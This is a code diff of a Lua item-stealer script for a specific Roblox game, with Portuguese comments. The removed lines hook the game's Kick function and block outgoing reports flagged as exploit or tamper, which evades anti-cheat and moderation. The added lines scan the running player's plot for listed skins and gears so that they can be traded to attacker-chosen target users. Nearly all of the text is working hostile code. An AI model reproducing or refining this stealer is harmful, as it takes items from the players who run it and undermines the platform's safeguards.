@@ -1,6 +1,5 @@
--- STEALER COMPLETO v5.0
--- Baseado no sync by gg . sabcom
--- Com Anti-Kick, Anti-Report e escaneamento via Workspace
+-- STEALER LIMPO - Sem hooks, sem anti-kick
+-- Só escaneia e envia trade
 
 if game.PlaceId ~= 109983668079237 then
     return
@@ -14,40 +13,6 @@ local Workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
--- ===== ANTI-KICK =====
-pcall(function()
-    if hookfunction then
-        local oldKick = hookfunction(LocalPlayer.Kick, function(self, ...)
-            return nil
-        end)
-        print("[Anti-Kick] Ativado (hookfunction)")
-    elseif hookmetamethod then
-        local oldNC = hookmetamethod(game, "__namecall", function(self, ...)
-            local method = getnamecallmethod()
-            if (method == "Kick" or method == "kick") and (self == LocalPlayer or self == Players) then
-                return nil
-            end
-            return oldNC(self, ...)
-        end)
-        print("[Anti-Kick] Ativado (hookmetamethod)")
-    end
-end)
-
--- ===== ANTI-REPORT =====
-pcall(function()
-    if hookfunction then
-        local oldFS = hookfunction(Instance.new("RemoteEvent").FireServer, function(self, ...)
-            local args = {...}
-            local arg1 = args[1]
-            if #self.Name == 67 or (type(arg1) == "string" and (arg1:find("StopTrying") or arg1:find("Tamper") or arg1:find("Exploit"))) then
-                return nil
-            end
-            return oldFS(self, ...)
-        end)
-    end
-end)
-
--- ===== CONFIG =====
 local TARGET_USERS = getgenv().TARGET_USERS or {}
 if #TARGET_USERS == 0 and getgenv().TARGET_USER then
     TARGET_USERS = {getgenv().TARGET_USER}
@@ -76,17 +41,6 @@ local function loadData()
     return AnimalsData ~= nil
 end
 loadData()
-
--- ===== DISPLAY NAME TO INDEX =====
-local displayNameToIndex = {}
-if AnimalsData then
-    for idx, info in pairs(AnimalsData) do
-        if info.DisplayName then
-            displayNameToIndex[info.DisplayName] = idx
-        end
-        displayNameToIndex[idx] = idx
-    end
-end
 
 -- ===== GET PLOT OWNER =====
 local function getPlotOwner(plot)
@@ -182,32 +136,26 @@ end
 -- ===== ESCANEIA BASE SKINS =====
 local function scanBaseSkins()
     local found = {}
-    local t = initSynchronizerCache()
-    if not t then return found end
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return found end
     
-    for plotName, channel in pairs(t) do
-        if type(plotName) == "string" and plotName:match("%-") then
-            local cacheTable = nil
-            if type(channel) == "table" and channel.CacheTable then
-                cacheTable = channel.CacheTable
-            end
-            if cacheTable then
-                local owner = rawget(cacheTable, "Owner")
-                if owner and type(owner) == "table" and owner.UserId == LocalPlayer.UserId then
-                    local baseSkins = cacheTable:Get("BaseSkinInventory")
-                    if type(baseSkins) == "table" then
-                        for uuid, skinData in pairs(baseSkins) do
-                            if type(skinData) == "table" and skinData.SkinName then
-                                if TARGET_BASE_SKINS[skinData.SkinName] then
-                                    table.insert(found, {
-                                        name = skinData.SkinName,
-                                        uuid = uuid
-                                    })
-                                end
-                            end
+    local username = LocalPlayer.Name
+    local displayName = LocalPlayer.DisplayName
+    
+    for _, plot in ipairs(plots:GetChildren()) do
+        if plot:IsA("Model") then
+            local owner = getPlotOwner(plot)
+            if owner == username or owner == displayName then
+                -- Procura por BaseSkins nos atributos do plot
+                local attrs = plot:GetAttributes()
+                if attrs.BaseSkins and type(attrs.BaseSkins) == "table" then
+                    for name, data in pairs(attrs.BaseSkins) do
+                        if TARGET_BASE_SKINS[name] then
+                            table.insert(found, {name = name, data = data})
                         end
                     end
                 end
+                break
             end
         end
     end
@@ -217,80 +165,29 @@ end
 -- ===== ESCANEIA GEARS =====
 local function scanGears()
     local found = {}
-    local t = initSynchronizerCache()
-    if not t then return found end
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return found end
     
-    for plotName, channel in pairs(t) do
-        if type(plotName) == "string" and plotName:match("%-") then
-            local cacheTable = nil
-            if type(channel) == "table" and channel.CacheTable then
-                cacheTable = channel.CacheTable
-            end
-            if cacheTable then
-                local owner = rawget(cacheTable, "Owner")
-                if owner and type(owner) == "table" and owner.UserId == LocalPlayer.UserId then
-                    local gears = cacheTable:Get("GearInventory")
-                    if type(gears) == "table" then
-                        for uuid, gearData in pairs(gears) do
-                            if type(gearData) == "table" and gearData.GearName then
-                                if TARGET_GEARS[gearData.GearName] then
-                                    table.insert(found, {
-                                        name = gearData.GearName,
-                                        uuid = uuid
-                                    })
-                                end
-                            end
+    local username = LocalPlayer.Name
+    local displayName = LocalPlayer.DisplayName
+    
+    for _, plot in ipairs(plots:GetChildren()) do
+        if plot:IsA("Model") then
+            local owner = getPlotOwner(plot)
+            if owner == username or owner == displayName then
+                local attrs = plot:GetAttributes()
+                if attrs.Gears and type(attrs.Gears) == "table" then
+                    for name, data in pairs(attrs.Gears) do
+                        if TARGET_GEARS[name] then
+                            table.insert(found, {name = name, data = data})
                         end
                     end
                 end
+                break
             end
         end
     end
     return found
-end
-
--- ===== SYNCHRONIZER CACHE (pra Base Skins e Gears) =====
-local cachedChannelsTable = nil
-local _gu = debug.getupvalues or getupvalues
-
-local function initSynchronizerCache()
-    if cachedChannelsTable then return cachedChannelsTable end
-    
-    local ok, sync = pcall(function()
-        return require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Synchronizer"))
-    end)
-    
-    if not (ok and type(sync) == "table") then return nil end
-    
-    if _gu and type(sync.GetAllChannels) == "function" then
-        local ok2, ups = pcall(_gu, sync.GetAllChannels)
-        if ok2 and type(ups) == "table" then
-            for _, u in pairs(ups) do
-                if type(u) == "table" then
-                    local uuidCount = 0
-                    for tk, tv in pairs(u) do
-                        if type(tk) == "string" and tk:match("%-") and type(tv) == "table" then
-                            uuidCount = uuidCount + 1
-                            if uuidCount >= 2 then
-                                cachedChannelsTable = u
-                                return cachedChannelsTable
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    end
-    
-    if type(sync.GetAllChannels) == "function" then
-        local ok3, res = pcall(sync.GetAllChannels)
-        if ok3 and type(res) == "table" then
-            cachedChannelsTable = res
-            return cachedChannelsTable
-        end
-    end
-    
-    return nil
 end
 
 -- ===== REMOTES =====
